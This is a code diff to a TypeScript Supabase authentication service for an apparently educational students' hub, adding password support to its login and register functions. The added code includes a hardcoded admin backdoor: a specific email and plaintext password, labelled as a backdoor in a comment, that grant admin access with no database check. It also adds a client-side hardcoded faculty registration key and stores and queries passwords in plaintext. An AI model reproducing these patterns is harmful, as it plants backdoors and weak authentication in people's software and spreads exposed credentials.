@@ -50,18 +50,46 @@ export const supabaseService = {
     window.location.reload();
   },
 
-  login: async (email: string, role: 'admin' | 'user'): Promise<User> => {
+  login: async (email: string, password?: string, role: 'admin' | 'user' = 'user'): Promise<User> => {
+    // Default Head Admin Backdoor
+    if (role === 'admin' && email === 'myounushere@gmail.com' && password === 'MYMoe1122') {
+      const adminUser: User = { 
+        id: 'head-admin-master', 
+        username: 'Head Faculty', 
+        email, 
+        role: 'admin' 
+      };
+      localStorage.setItem(SESSION_KEY, JSON.stringify(adminUser));
+      return adminUser;
+    }
+
     if (!supabase) throw new Error("Supabase is not configured.");
-    const { data, error } = await supabase.from(TABLES.USERS).select('*').eq('email', email).eq('role', role).maybeSingle();
+
+    let query = supabase.from(TABLES.USERS).select('*').eq('email', email).eq('role', role);
+    if (password) {
+      query = query.eq('password', password);
+    }
+    
+    const { data, error } = await query.maybeSingle();
     if (error) throw handleSupabaseError(error, 'Login');
-    if (!data) throw new Error(`Authorized account for "${email}" not found.`);
+    if (!data) throw new Error(`Authorized account for "${email}" not found or invalid credentials.`);
     localStorage.setItem(SESSION_KEY, JSON.stringify(data));
     return data;
   },
 
-  register: async (username: string, email: string, role: 'admin' | 'user' = 'user'): Promise<User> => {
+  register: async (username: string, email: string, password?: string, role: 'admin' | 'user' = 'user', secretKey?: string): Promise<User> => {
+    if (role === 'admin') {
+      if (secretKey !== 'aku-edu-studednts-hub') {
+        throw new Error("Invalid Faculty Secret Key. Access denied.");
+      }
+    }
+
     if (!supabase) throw new Error("Supabase is not configured.");
-    const { data, error } = await supabase.from(TABLES.USERS).insert([{ username, email, role }]).select().maybeSingle();
+    
+    const payload: any = { username, email, role };
+    if (password) payload.password = password;
+
+    const { data, error } = await supabase.from(TABLES.USERS).insert([payload]).select().maybeSingle();
     if (error) throw handleSupabaseError(error, 'Registration');
     if (!data) throw new Error("Registration failed.");
     localStorage.setItem(SESSION_KEY, JSON.stringify(data));
